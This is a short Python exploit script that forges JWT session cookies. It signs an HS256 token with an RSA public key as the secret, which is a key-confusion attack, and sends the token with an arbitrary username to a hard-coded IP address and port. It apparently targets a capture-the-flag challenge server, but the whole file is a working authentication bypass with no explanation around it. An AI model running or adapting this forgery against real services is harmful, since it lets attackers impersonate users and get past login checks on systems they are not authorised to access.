import jwt
import requests
import sys
from bs4 import BeautifulSoup

def token(username):
    pk = '''-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n'''
    payload = {'username' : username, 'pk' : pk, 'iat' : '1608481629'}
    return jwt.encode(payload, key=pk, algorithm="HS256").decode()

def send_request(username):
    url = 'http://134.209.29.219:30323/'
    cookies = {'session' : token(username)}
    print(BeautifulSoup(requests.get(url, cookies=cookies).text, 'html.parser').find('div', class_='card-body').get_text())

if __name__ == '__main__':
    username = sys.argv[1]
    send_request(username)
